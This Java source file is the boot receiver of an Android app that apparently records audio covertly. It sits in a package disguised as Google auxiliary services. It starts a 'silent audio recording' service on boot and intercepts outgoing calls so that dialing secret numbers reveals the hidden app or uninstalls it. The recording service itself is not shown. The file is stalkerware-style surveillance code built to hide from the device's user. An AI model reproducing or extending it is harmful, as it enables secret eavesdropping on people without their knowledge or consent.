package com.tools.google.auxiliaryservices;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

/**
 * Created by Gabriele on 30/05/16.
 */
public class BootReceiver extends BroadcastReceiver
{
    @Override
    public void onReceive(Context context, Intent intent)
    {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
        {
            context.startService(new Intent(context, SilenceAudioRecordingService.class));
        }
        else if (intent.getAction().equals("SilenceAudioRecordingService.SERVICE_START"))
        {
            context.startService(new Intent(context, SilenceAudioRecordingService.class));
        }
        else if (intent.getAction().equals("SilenceAudioRecordingService.SERVICE_STOP"))
        {
            context.stopService(new Intent(context, SilenceAudioRecordingService.class));
        }
        else if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL))
        {
            Bundle bundle = intent.getExtras();
            if (null == bundle) return;
            //get phone number
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            //Configuration
            ConfigurationFile configuration = new ConfigurationFile(context);
            //case SHOW ICO
            if (phoneNumber.equals(configuration.mShowNumber))
            {
                setResultData(null);
                Intent appIntent = new Intent(context, SilenceAudioRecordingActivity.class);
                appIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(appIntent);
            }
            //case UNINSTALL
            else if (phoneNumber.equals(configuration.mUninstallNumber))
            {
                try
                {
                    setResultData(null);
                    Uri packageURI = Uri.parse("package:" + SilenceAudioRecordingActivity.class.getPackage().getName());
                    Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
                    uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                    context.startActivity(uninstallIntent);
                }
                catch (Exception e)
                {
                    //ignore
                }
            }
        }
    }
}